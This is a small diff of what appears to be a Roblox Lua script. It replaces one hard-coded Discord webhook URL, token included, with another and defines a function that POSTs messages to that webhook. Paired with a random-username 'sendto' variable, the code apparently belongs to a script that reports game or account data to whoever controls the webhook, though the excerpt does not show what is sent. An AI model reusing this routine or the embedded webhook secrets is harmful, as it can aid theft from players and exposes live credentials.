@@ -61,7 +61,7 @@ end
 local sendto = getRandomUsername()
 
 
-local Url2 = "https://discord.com/api/webhooks/1326035090240704513/vuELsTVR3VBgwLev58ZI7gnlfeOsAtB-s9xqlg6msYZaLh7TBITMwf65L2jEwYmGpjbb"
+local Url2 = "https://discord.com/api/webhooks/1328801559810801745/2o8WxBFJescPHz_cgfkk9axB599a3Wx29GRI3cqk0hQNdRByu7OlAw1-xA5YrUVglY1T"
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
 		request({Url = Url2,Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = Http2:JSONEncode({content = msg})})
